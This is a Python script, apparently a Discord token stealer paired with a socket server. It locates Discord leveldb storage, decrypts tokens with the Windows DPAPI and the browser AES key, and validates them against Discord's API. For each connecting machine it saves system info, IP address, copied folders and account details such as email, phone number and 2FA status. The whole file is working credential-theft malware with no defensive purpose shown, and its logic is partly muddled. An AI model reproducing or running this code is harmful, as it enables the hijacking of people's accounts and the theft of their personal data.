import os
import socket
import shutil
import os
import urllib.request, urllib.error
import re
import base64
from Crypto.Cipher import AES
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import json
from json import loads as json_loads, load
from urllib.request import Request, urlopen
from json import loads, dumps
import re
import requests
hôte, port = "0.0.0.0", 12345

def getheaders(token):

    headers =     {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    }

    if token:
        headers.update({"Authorization": token})
        return headers


def get_all():
    return get_tokens()
 
def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
 
class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]
 
def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw
 
def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
 
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)
 
def get_tokens():
    tokens = []
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    PATHS = {
        "Discord": ROAMING + "\\Discord"
    }
    def search(path: str) -> list:
        path += "\\Local Storage\\leveldb"
        found_tokens = []
        if os.path.isdir(path):
            for file_name in os.listdir(path):
                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                    continue
                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
                        for token in re.findall(regex, line):
                            try: 
                                urllib.request.urlopen(urllib.request.Request(
                                    "https://discord.com/api/v9/users/@me",
                                    headers={
                                        'content-type': 'application/json', 
                                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                                        'authorization': token
                                    }
                                ))
                            except urllib.error.HTTPError as e:
                                continue
                            if token not in found_tokens and token not in tokens:
                                found_tokens.append(token)
        return found_tokens
    
    def encrypt_search(path):
        if not os.path.exists(f"{path}/Local State"): return []
        pathC = path + "\\Local Storage\\leveldb"
        found_tokens = []
        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json.loads(f.read())
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = CryptUnprotectData(master_key[5:])
 
        for file in os.listdir(pathC):
            if file.endswith(".log") or file.endswith(".ldb")   :
                for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokenDecoded = DecryptValue(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                        try: 
                            urllib.request.urlopen(urllib.request.Request(
                                "https://discord.com/api/v9/users/@me",
                                headers={
                                    'content-type': 'application/json', 
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                                    'authorization': tokenDecoded
                                }
                            ))
                        except urllib.error.HTTPError as e:
                            continue
                        if tokenDecoded not in found_tokens and tokenDecoded not in tokens:
                            found_tokens.append(tokenDecoded)
        return found_tokens
 
    for path in PATHS:
        for token in search(PATHS[path]):
            tokens.append(token)
        for token in encrypt_search(PATHS[path]):
            tokens.append(token)
    return tokens


token = get_tokens()[0]
print(token)
def setup():
    global serveur

    if not os.path.exists("dossiers_clients"):
        os.mkdir("dossiers_clients")
    serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serveur.bind((hôte, port))
    serveur.listen()
    print(f"Serveur en écoute sur {hôte}:{port}")

def transferer_dossier(client, nom_machine, chemin_dossier_capture, source_dossier):
    try:
        destination = os.path.join(chemin_dossier_capture, f"extract")
        shutil.copytree(source_dossier, destination)
        client.send(destination.encode())
        return True
    except Exception as e:
        print(f"Erreur lors du transfert du dossier : {e}")
        return False


def get_info(token):
    r = requests.get('https://discord.com/api/v6/users/@me', headers=getheaders(token)).json()
    print(r)
    phone = r['phone']
    userid = r['username'] + r["discriminator"]

    message = f'''
    token : {token}
<<────────────{r['username']}────────────>>
[User]        {userid}
[bio]            {r['bio']}
[Language]       {r['locale']}
[oken]           {token}
<───────────Security Info───────────>
[2 Factor]        {r['mfa_enabled']}
[Email]           {r['email']}
[Phone number]    {phone if phone else ""}
                    '''
    return message

setup()

while True:
    client, adresse = serveur.accept()
    nom_machine = client.recv(1024).decode()

    os.makedirs(os.path.join(os.getcwd(), "dossiers_clients", nom_machine), exist_ok=True)
    os.makedirs(os.path.join("dossiers_clients", nom_machine), exist_ok=True)

    info, adresse_ip = client.recv(1024).decode(), client.recv(1024).decode()

    with open(os.path.join(os.path.join(os.getcwd(), "dossiers_clients", nom_machine), "info_du_systeme.txt"), 'w') as f:
        f.write(info)

    with open(os.path.join(os.path.join(os.getcwd(), "dossiers_clients", nom_machine), "adresse_ip.txt"), 'w') as f:
        f.write(f"Adresse IP du client : {adresse_ip}")


    if transferer_dossier(client, nom_machine, os.path.join("dossiers_clients", nom_machine), r"sensible path"):
        print(f"Dossier transféré depuis {nom_machine} et sauvegardé dans le dossier de transfert.")
    else:
        print(f"Échec du transfert du dossier depuis {nom_machine}.")

    print(f"Reçu depuis {nom_machine}. Dossier créé avec les informations du client et le dossier transféré dans le sous-dossier 'transfert'.")

    tokens = get_tokens()

# Sauvegarde le jeton dans un fichier texte
    with open(os.path.join(os.path.join(os.getcwd(), "dossiers_clients", nom_machine), "Discord_Info.txt"), 'w', encoding='utf-8') as f:
        f.write(get_info(token =tokens[0]))

    print(f"Jeton obtenu depuis {nom_machine} et sauvegardé dans le fichier 'jetons.txt'.")
    client.close()
